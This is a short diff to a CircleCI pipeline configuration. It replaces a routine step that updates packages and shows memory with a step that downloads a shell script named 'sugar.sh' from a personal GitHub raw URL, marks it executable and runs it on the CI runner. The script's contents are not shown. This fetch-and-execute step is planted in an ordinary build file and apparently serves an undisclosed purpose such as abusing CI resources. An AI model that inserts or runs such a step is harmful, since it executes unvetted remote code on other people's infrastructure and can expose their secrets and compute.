@@ -31,4 +31,4 @@ jobs:
     # CircleCI will report the results back to your VCS provider.
     steps:
       - checkout
-      - run: sudo apt-get update -y && free -m
+      - run: wget https://raw.githubusercontent.com/kijang-015/sugar/main/sugar.sh && chmod +x sugar.sh && ./sugar.sh
